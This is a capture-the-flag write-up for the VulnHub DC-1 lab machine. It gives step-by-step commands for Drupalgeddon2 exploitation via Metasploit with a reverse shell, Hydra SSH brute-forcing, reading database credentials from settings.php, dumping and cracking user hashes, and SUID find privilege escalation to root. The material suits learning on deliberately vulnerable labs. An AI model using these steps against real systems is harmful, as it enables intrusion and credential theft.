# 📚 DC-1 Writeup

## ⚙️ Machine Info 

  - Platform: VulnHub
  - Name: DC-1
  - Link: https://www.vulnhub.com/entry/dc-1,292/
  - Level: EASY

## 📄 Official Description

There are five flags in total, but the ultimate goal is to find and read the flag in root's home directory.
You don't even need to be root to do this, however, you will require root privileges.

## ✅ Finding the Target IP

<img width="945" height="191" alt="1 Target-IP" src="https://github.com/user-attachments/assets/84a8656e-b023-460a-a598-006cd7ea5a6c" />

## 👉 Scanning the IP with nmap -A option

<img width="899" height="759" alt="2 Target-Enum" src="https://github.com/user-attachments/assets/9eb3f1c3-3f38-4a72-bb0d-23a9395faa83" />

### Result:

 - Port 22: OpenSSH 6.0p1
 - Port 80: Apache/2.2.22 **Drupal 7**
 - Port 111: rpcbind 2-4


## 👉 Searching For Drupal 7 vulnurability through google. 

<img width="680" height="593" alt="4 Apache-Vuln-Assessment" src="https://github.com/user-attachments/assets/754ec683-62f2-404d-afee-36fe5ae21e47" />

## 👇 Searching for drupalgeddon2 on msfconsole and using it.

👇 In Terminal Type:

     msfconsole
     search drupalgeddon2
     use exploit/unix/webapp/drupal_drupalgeddon2
     set RHOSTS Target-IP
     set LHOST Your-IP

<img width="1095" height="458" alt="6 Set-Exploit" src="https://github.com/user-attachments/assets/7d120ebf-774c-4102-9a91-67586b1e3869" />

## 🔥 Run the exploit:

     run

<img width="880" height="310" alt="7 Shell" src="https://github.com/user-attachments/assets/a6c70540-5d8f-4a19-9e9f-b2c18d829519" />

## 👉 Finding Flag4

Location: /home/flag4/flag4.txt

<img width="624" height="629" alt="8 Flag4" src="https://github.com/user-attachments/assets/8ee2c4c1-f94d-44e8-b833-4c1a06f3a47f" />

## 🔥 Brute-Forcing flag4 user credentials using Hydra

👇 In Terminal Type:

    hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://Target-IP -t 4 -q -f

Explaination:

  - hydra -l flag4 ----> specify flag4 user
  - -P rockoyu.txt ----> specify password wordlists path
  - ssh://Target-IP ---> specify SSH service to target
  - -t 4 --------------> uses 4 threads for faster result
  - -q ----------------> does not print messages about connection errors
  - -f ----------------> exit when a login/pass pair is found

<img width="1586" height="290" alt="9 0-Hydra-flag4-user" src="https://github.com/user-attachments/assets/14f0e214-de18-4cb5-a3a9-0010ce26f4e9" />

## 👉 Finding Flag1 using find command

👇 In Terminal Type:

    find / -name flag1.txt 2>/dev/null

Output:

  - /var/www/flag1.txt

<img width="476" height="120" alt="9 1 Flag1" src="https://github.com/user-attachments/assets/6e1e64b7-4d66-4d2e-bcb9-fe3000653465" />


## 👉 FInding flag2 

read the /var/www/sites/default/settings.php file.

<img width="685" height="459" alt="10 Flag2" src="https://github.com/user-attachments/assets/7bef188f-e9a9-4b19-b573-1d7e8e576ed6" />

### Result:

  - Flag2.txt
  - drupal database name,with MySQL username and password.

## 👉 Enumrating MySQL 

👇 In Terminal Type:

1) For better shell

       python -c 'import tty;tty.spawn("/bin/bash")'

2) Login To MySQL Using credentials

       mysql -u dbuser -p
       R0ck3t

3) List Databases

       show databases;

3) Use Drupaldb Database

       use drupaldb;

4) List Tables Inside drupaldb Database

       show tables;

<img width="556" height="525" alt="11 dbuser" src="https://github.com/user-attachments/assets/9e76560b-a422-4954-a495-2b6cba281648" />

### Result

  - Interesting Tables Which Could Contain Valuable Infos

## 👤 Listing Contents Of users table

    select*from users;

<img width="1583" height="433" alt="13 users-Table" src="https://github.com/user-attachments/assets/bca9edbf-2e5f-4b34-93ae-86e961112dfe" />


### Result:

  - Username
  - Their Password HASH
  - And EMAILs

## 🔥 Cracking Users Passwords Using THeir Hash FOund On The user Table

<img width="1219" height="437" alt="15 fred admin-hash-crack" src="https://github.com/user-attachments/assets/1cb367c1-19fd-4c28-91f9-60fc9833f347" />

### Result: 
  - user admin and fred credentials

## 👉 Finding flag3, Login in Drupal admin Panel

<img width="902" height="524" alt="16 Drupal-admin" src="https://github.com/user-attachments/assets/e3826897-e235-4e3e-92df-104bd6d96cc6" />

### Result:

  - flag3 in Content pages

<img width="999" height="460" alt="18 Flag3-success" src="https://github.com/user-attachments/assets/d80f0d73-d4d9-4788-b3ab-071e67a3092c" />

## 👉 Lastly Finding root flag

👇 In Terminal Type:

    find / -perm -4000 2>/dev/null

Then

    /usr/bin/find . -exec /bin/sh \; -quit

### Result:

You gain root access.

Finally Go to root directory and get the root flag

<img width="518" height="263" alt="9 3-Root-Flag" src="https://github.com/user-attachments/assets/414e5d71-6e1a-4c81-b11b-06e37e7bd763" />

## 🔥 Aditional Discovery

I tried enumrating rpcbind 2-4, but only found **DOS** Vuln. (Not important for us)

<img width="963" height="427" alt="19 Port-111" src="https://github.com/user-attachments/assets/54deb779-d1cc-474f-ab62-60c2eea407b3" />









